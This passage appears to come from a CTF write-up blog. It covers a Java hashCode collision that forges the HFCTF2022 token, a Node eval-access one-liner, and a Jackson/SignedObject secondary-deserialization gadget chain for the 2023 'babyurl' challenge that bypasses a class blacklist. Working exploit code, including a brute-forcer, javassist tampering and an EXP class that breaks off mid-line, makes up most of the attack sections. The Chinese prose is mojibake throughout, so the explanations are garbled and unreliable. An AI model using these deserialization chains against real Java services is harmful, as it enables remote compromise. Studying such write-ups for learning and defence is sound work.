class="hljs-string">&quot;&amp;&quot;</span>);<br>            <span class="hljs-type">int</span> v3;<br>            <span class="hljs-keyword">for</span>(v3 = <span class="hljs-number">0</span>; v3 &lt; v5.length; ++v3) &#123;<br>                String[] entry = v5[v3].split(<span class="hljs-string">&quot;=&quot;</span>);<br>                <span class="hljs-keyword">if</span>(entry.length &gt; <span class="hljs-number">1</span>) &#123;<br>                    result.put(entry[<span class="hljs-number">0</span>], entry[<span class="hljs-number">1</span>]);<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    result.put(entry[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;&quot;</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;server start&quot;</span>);<br>        <span class="hljs-type">HttpServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> HttpServer.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(<span class="hljs-number">8090</span>), <span class="hljs-number">0</span>);<br>        server.createContext(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyHandler</span>());<br>        server.setExecutor(Executors.newCachedThreadPool());<br>        server.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªé—®é¢˜ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> (String)queryMap.get(<span class="hljs-string">&quot;token&quot;</span>);<br><span class="hljs-keyword">if</span>(Objects.hashCode(token) == <span class="hljs-string">&quot;HFCTF2022&quot;</span>.hashCode() &amp;&amp; !<span class="hljs-string">&quot;HFCTF2022&quot;</span>.equals(token)) &#123;<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> t.getRequestBody();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(is).readObject();<br>    &#125;<br></code></pre></td></tr></table></figure><p>å“ˆå¸Œç¢°æ’ï¼Œä¸è¿‡<code>java</code>é‡Œè¿™ä¸ª<code>hashcode</code>è¿™æ ·å®šä¹‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> hash;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span> &amp;&amp; value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">char</span> val[] = value;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; value.length; i++) &#123;<br>            h = <span class="hljs-number">31</span> * h + val[i];<br>        &#125;<br>        hash = h;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯è¿™ä¸ª<code>h = 31 * h + val[i];</code>ã€‚å¦‚æœæƒ³æ‰¾ä¸ªå­—ç¬¦ä¸²çš„<code>hashcode</code>å’Œ<code>HFCTF2022</code>ç›¸ç­‰çš„è¯ï¼šåªè¦æœ€åä¸¤ä½æ»¡è¶³ï¼š<code>31a+b=31x+y</code>å°±è¡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Objects;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hashcode_colli</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">alphebat</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;A&#x27;</span>; c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>; c++) &#123;<br>            alphebat += c;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span>; c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>; c++) &#123;<br>            alphebat += c;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;0&#x27;</span>; c &lt;= <span class="hljs-string">&#x27;9&#x27;</span>; c++) &#123;<br>            alphebat += c;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">secret</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HFCTF2022&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; alphebat.length(); i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; alphebat.length(); j++) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HFCTF20&quot;</span>; <br>                token+=alphebat.charAt(i);<br>                token+=alphebat.charAt(j);<br>                <span class="hljs-keyword">if</span> (Objects.hashCode(token) == secret.hashCode() &amp;&amp; !secret.equals(token)) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;SUCCESS&quot;</span>);<br>                    System.out.println(token);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//HFCTF200p HFCTF201Q</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">global</span>[<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(<span class="hljs-variable language_">global</span>).<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">x</span>=&gt;</span>x.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;eval&#x27;</span>))])<br></code></pre></td></tr></table></figure><h2 id="2023æå®¢å·…å³°babyurl"><a href="#2023æå®¢å·…å³°babyurl" class="headerlink" title="2023æå®¢å·…å³°babyurl"></a>2023æå®¢å·…å³°babyurl</h2><p><code>java</code>äºŒæ¬¡ååºåˆ—åŒ–çš„é¢˜ï¼Œè·Ÿç€<code>wp</code>å†™çš„ã€‚ä¸»è¦ç›®çš„å°±æ˜¯å­¦ä¹ äºŒæ¬¡ååºåˆ—åŒ–</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://xilitter.github.io/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">1</a></p><p><a href="https://www.xiinnn.com/posts/2023dfjk-babyurl/">2</a></p><p>æ‹¿åˆ°<code>jar</code>æ–‡ä»¶ç›´æ¥ä¸¢IDEAåç¼–è¯‘ä¸‹ï¼Œæ³¨æ„ä¸‹é¢è¿™å‡ ä¸ªç±»ï¼š</p><p><code>IndexController.java</code>å­˜åœ¨ï¼š</p><p><img src="/img/babyurl1.png" alt="babyurl1"></p><p><code>/hack</code>è·¯ç”±æ¥å—<code>payload</code>å‚æ•°ï¼Œ<code>base64</code>è§£ç åååºåˆ—åŒ–ï¼Œç„¶åå†æŠŠååºåˆ—åŒ–çš„ç»“æœ<code>o</code>å’Œå®ƒçš„å±æ€§<code>url</code>æ‰“å°å‡ºæ¥ã€‚<code>MyObjectInputStream</code>æ˜¯ä»–è‡ªå®šä¹‰çš„è¾“å…¥æµçš„ç±»ï¼š</p><p><img src="/img/babyurl4.png" alt="babyurl4"></p><p><code>String</code>æ•°ç»„æ˜¯è¿™ä¸ªï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="hljs-string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLVisiter&quot;</span>, <span class="hljs-string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/img/objectinputstream.png" alt="objectinputstream"></p><p>ä½œç”¨å°±æ˜¯åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­é˜»æ­¢ç‰¹å®šç±»ååºåˆ—åŒ–ã€‚è¿™é‡Œçœ‹çœ‹ä»–åé¢è‡ªå·±å®šä¹‰é‚£ä¸¤ä¸ªï¼š<br><img src="/img/babyurl5.png" alt="babyurl5"></p><p>ä¸»è¦ä½œç”¨å°±æ˜¯è¯»å–ç‰¹å®š<code>URL</code>çš„å†…å®¹å¹¶è¿”å›ï¼Œä½†æ³¨æ„<code>ban</code>äº†<code>file</code>åè®®ã€‚</p><p><img src="/img/babyurl6.png" alt="babyurl6"></p><p>ç®€å•è¯´å°±æ˜¯é€šè¿‡é‡å†™<code>readObject</code>æ–¹æ³•æŠŠ<code>URLvisiter</code>çš„ç»“æœå†™åˆ°<code>tmp/file</code>æ–‡ä»¶ä¸­ã€‚</p><p>ç°åœ¨è§£é¢˜æ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼šé€šè¿‡ååºåˆ—åŒ–ç‰¹å®šçš„<code>URLHelper</code>å®ä¾‹è°ƒç”¨å…¶é‡å†™çš„<code>readObject</code>æ–¹æ³•è¾¾åˆ°å°†ç‰¹å®š<code>URL</code>ä¸­çš„å†…å®¹å†™åˆ°ç‰¹å®šæ–‡ä»¶ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URLHelper</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLHelper</span>(<span class="hljs-string">&quot;http://127.0.0.1:8888/flag.txt&quot;</span>);<br><span class="hljs-type">URLVisiter</span> <span class="hljs-variable">urlVisiter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLVisiter</span>();<br><span class="hljs-type">Field</span> <span class="hljs-variable">aaa</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;visiter&quot;</span>);<br>aaa.set(handler,urlVisiter);<br></code></pre></td></tr></table></figure><p>ä½†é—®é¢˜æ˜¯<code>ban</code>äº†è¿™ä¸¤ä¸ªå…³é”®ç±»ã€‚ã€‚æ‰€ä»¥è¦è€ƒè™‘åˆ«çš„æ–¹æ³•ï¼šäºŒæ¬¡ååºåˆ—åŒ–</p><p><code>SignedObject</code>ç±»å­˜åœ¨<code>getObject</code>æ–¹æ³•ï¼Œé‡Œé¢è°ƒç”¨äº†<code>readObject</code>ï¼š</p><p><img src="/img/babyurl9.png" alt="babyurl9"></p><p>è€Œä¸”<code>content</code>å®Œå…¨å¯æ§ï¼Œçœ‹å®ƒçš„æ„é€ æ–¹æ³•ï¼Œåˆå§‹åŒ–æ—¶ç›´æ¥è¿›è¡Œäº†åºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">SignedObject</span><span class="hljs-params">(Serializable object, PrivateKey signingKey, Signature signingEngine)</span><br>        <span class="hljs-keyword">throws</span> IOException, InvalidKeyException, SignatureException &#123;<br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ª ByteArrayOutputStream å¯¹è±¡ï¼Œå®ƒæ˜¯ä¸€ä¸ªå­—èŠ‚æ•°ç»„è¾“å‡ºæµï¼Œç”¨äºå°†å¯¹è±¡åºåˆ—åŒ–åçš„æ•°æ®å†™å…¥å­—èŠ‚æ•°ç»„</span><br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ª ObjectOutputStream å¯¹è±¡ï¼Œå¹¶å°†å…¶è¿æ¥åˆ° ByteArrayOutputStream ä¸Šï¼Œç”¨äºå°†å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—èŠ‚æµ</span><br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(b);<br><br>    <span class="hljs-comment">// å°†ä¼ å…¥çš„å¯¹è±¡ object åºåˆ—åŒ–ä¸ºå­—èŠ‚æµï¼Œå¹¶å°†å…¶å†™å…¥åˆ° ByteArrayOutputStream ä¸­</span><br>    a.writeObject(object);<br>    <br>    <span class="hljs-comment">// åˆ·æ–° ObjectOutputStreamï¼Œç¡®ä¿æ‰€æœ‰æ•°æ®éƒ½è¢«å†™å…¥åˆ° ByteArrayOutputStream ä¸­</span><br>    a.flush();<br>    <br>    <span class="hljs-comment">// å…³é—­ ObjectOutputStreamï¼Œé‡Šæ”¾èµ„æº</span><br>    a.close();<br>    <br>    <span class="hljs-comment">// å°† ByteArrayOutputStream ä¸­çš„å­—èŠ‚æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ï¼Œå¹¶èµ‹å€¼ç»™ SignedObject ä¸­çš„ content å±æ€§</span><br>    <span class="hljs-built_in">this</span>.content = b.toByteArray();<br>    <br>    <span class="hljs-comment">// å…³é—­ ByteArrayOutputStreamï¼Œé‡Šæ”¾èµ„æº</span><br>    b.close();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹ä¼ å…¥çš„<code>Object</code>è¿›è¡Œäº†åºåˆ—åŒ–ç„¶åä¼ ç»™<code>content</code>ï¼Œç°åœ¨å¯ä»¥å†™ä¸€ä¸ª<code>signedObject</code>ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">KeyPairGenerator keyPairGenerator;<br>keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(æ¶æ„ç±», privateKey, signingEngine);<br><span class="hljs-comment">//ç”¨äºç­¾åçš„ç§é’¥ç­‰å…¶ä»–ä¸¤ä¸ªå‚æ•°ä¸éœ€è¦æ·±ç©¶ï¼Œå½“ä¸ªæ¨¡æ¿ç”¨å°±å¯ä»¥ã€‚</span><br></code></pre></td></tr></table></figure><p>ç„¶åè°ƒç”¨<code>signedObject</code>çš„<code>getObject</code>æ–¹æ³•å°±èƒ½å®ç°å¯¹<code>object</code>è¿™ä¸ªæ¶æ„ç±»çš„åºåˆ—åŒ–ã€‚é‚£ä¹ˆå¦‚ä½•è§¦å‘<code>getObject</code>æ–¹æ³•ï¼Ÿè¿™é‡Œå…ˆé€šè¿‡ä¸€æ¬¡åºåˆ—åŒ–è§¦å‘<code>getObject</code>ï¼Œç„¶å<code>getObject</code>å†è§¦å‘ä¸€æ¬¡ååºåˆ—åŒ–ï¼š</p><p>è¿™é‡Œçš„<code>getter</code>æ–¹æ³•è¦åˆ©ç”¨<code>Jacksonåºåˆ—åŒ–</code>è§¦å‘ï¼š</p><p><a href="https://xz.aliyun.com/t/12509?time__1311=mqmhD50I1GOD/D0lD2DUh98mQ=1Y8eD">å‚è€ƒæ–‡ç« </a></p><p><a href="https://xilitter.github.io/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">å‚è€ƒæ–‡ç« </a></p><p>è¿™é‡Œç›´æ¥ç…§æ¬è¿™ä¸¤ä½å¸ˆå‚…çš„åˆ†æï¼š</p><p>åœ¨jacksonä¸­å°†å¯¹è±¡åºåˆ—åŒ–æˆä¸€ä¸ªjsonä¸²ä¸»è¦æ˜¯ä½¿ç”¨çš„<code>ObjectMapper#writeValueAsString</code>æ–¹æ³•</p><p><img src="/img/babyurl10.png" alt="babyurl10"></p><p>ç„¶åè·Ÿè¿›åˆ°_writeValueAndCloseé‡Œé¢</p><p><img src="/img/babyurl11.png" alt="babyurl11"></p><p>è·Ÿè¿›åˆ°è¿™ä¸ªåºåˆ—åŒ–å‡½æ•°é‡Œï¼Œåé¢å°±ç±»ä¼¼äºå°è£…äº†ï¼Œå±‚å±‚è°ƒç”¨</p><p><img src="/img/11.png" alt="11"></p><p>ç„¶åè°ƒç”¨åˆ°æœ€ç»ˆçš„è¿™ä¸ªserializeFieldsæ–¹æ³•</p><p><img src="/img/12.png" alt="12"></p><p>è¿™é‡Œå…¶å®å°±æ˜¯é€šè¿‡ä¸‰å…ƒè¿ç®—ç¬¦è¿›è¡Œ<code>getter</code>æ–¹æ³•çš„è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (_accessorMethod == <span class="hljs-literal">null</span>) ? _field.get(bean)<br>: _accessorMethod.invoke(bean, (Object[]) <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>å“ªäº›åœ°æ–¹å¯ä»¥è°ƒç”¨writeValueAsStringæ–¹æ³•ï¼Ÿ</p><p>PojoNodeä¸‹å­˜åœ¨nodeToStringæ–¹æ³•ï¼Œè°ƒç”¨äº†è¿™ä¸ªwriteValueAsStringï¼š</p><p><img src="/img/13.png" alt="13"></p><p>BaseJsonNodeçš„toStringæ–¹æ³•è°ƒç”¨äº†è¿™ä¸ªnodeToString:</p><p><img src="/img/14.png" alt="14"></p><p>è¿™é‡Œæ³¨æ„è¿™ä¿©ç±»çš„å…³ç³»ï¼šè¿™ä¸ªç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼ŒPOJONodeå°±å±äºå®ƒçš„ä¸€ä¸ªå®ç°ç±»(çˆ¶ä¸å­ï¼Œæˆ‘ä»¬åé¢å¯ä»¥é€šè¿‡è°ƒç”¨<code>POJONode.toString</code>æ–¹æ³•è°ƒç”¨å®ƒè‡ªèº«çš„<code>nodeToString</code>æ–¹æ³•)</p><p>BadAttributeValueExpExceptionä¸‹çš„eadObjectæ–¹æ³•è°ƒç”¨äº†toString:</p><p><img src="/img/15.png" alt="15"></p><p>ç°åœ¨å¯ä»¥æ‹ä¸‹æ€è·¯ï¼š</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean">BadAttributeValueExpException#readObject-&gt;<br>POJONode#toString-&gt;<br>ObjectWriter#writeValueAsString-&gt;<br>SignedObject#getObject-&gt;<br>äºŒæ¬¡ååºåˆ—åŒ–-&gt;<br>URLHelper#readObject-&gt;<br>URLVisiter#visitUrl<br>ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–ä¸ºäº†è°ƒç”¨getObjectæ–¹æ³•ï¼Œç¬¬äºŒæ¬¡ååºåˆ—åŒ–æ‰æ˜¯æ¶æ„ç±»çš„ååºåˆ—åŒ–<br></code></pre></td></tr></table></figure><p>ç„¶åè¿™é‡Œæœ‰ä¸ªå‘ï¼Œ<a href="https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/">å‚è€ƒæ–‡ç« </a><br>ä¸»è¦å°±æ˜¯<code>BaseJsonNodeç±»</code>åœ¨ååºåˆ—åŒ–æ—¶ä¼šèµ°ä»–è‡ªå®šä¹‰çš„ä¸€ä¸ª<code>writeReplace</code>æ–¹æ³•ï¼š</p><p><img src="/img/16.png" alt="16"></p><p>å¯ä»¥é€šè¿‡åå°„ç›´æ¥æŠŠå®ƒåˆ äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>    <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>    <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>    jsonNode.removeMethod(writeReplace);<br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>    jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>    <span class="hljs-comment">//ä»£ç è·å–å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ã€‚ç„¶åï¼Œä½¿ç”¨toClassæ–¹æ³•å°†ä¿®æ”¹åçš„BaseJsonNodeç±»å®šä¹‰åŠ è½½åˆ°JVMä¸­ã€‚</span><br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ³¨æ„è¿™ä¸ª<code>toClass</code>æ–¹æ³•æ˜¯<code>javassist</code> åº“ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¾—å¯¼å…¥ç›¸å…³ä¾èµ–æ‰èƒ½ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>  &lt;groupId&gt;org.javassist&lt;/groupId&gt;<br>  &lt;artifactId&gt;javassist&lt;/artifactId&gt;<br>  &lt;version&gt;<span class="hljs-number">3.25</span><span class="hljs-number">.0</span>-GA&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> com.yancao.ctf;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLHelper;<br><span class="hljs-keyword">import</span> com.yancao.ctf.bean.URLVisiter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CtfAttack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchAlgorithmException, SignatureException, InvalidKeyException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//æ¶æ„ç±»</span><br>        <span class="hljs-type">URLHelper</span> <span class="hljs-variable">urlHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLHelper</span>(<span class="hljs-string">&quot;http://127.0.0.1:8888/flag.txt&quot;</span>);<br>        <span 